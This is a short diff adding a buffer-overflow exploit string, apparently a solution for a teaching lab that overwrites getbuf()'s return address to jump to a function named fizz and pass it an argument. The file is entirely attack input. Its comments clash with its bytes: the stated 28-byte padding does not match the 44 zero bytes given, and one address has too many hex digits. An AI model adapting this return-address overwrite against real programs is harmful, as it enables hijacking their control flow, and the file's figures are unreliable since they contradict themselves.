@@ -1,0 +1,11 @@
+/* getbuf() return address :0x556830e4  */
+/* local bffer start at :0x556830cb8 */
+/* padding required: 28 byte */
+00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 
+/* fizz locatede at : 0x08048cba */
+ba 8c 04 08
+/* set argument */
+00 00 00 00 02 9a 3a 58
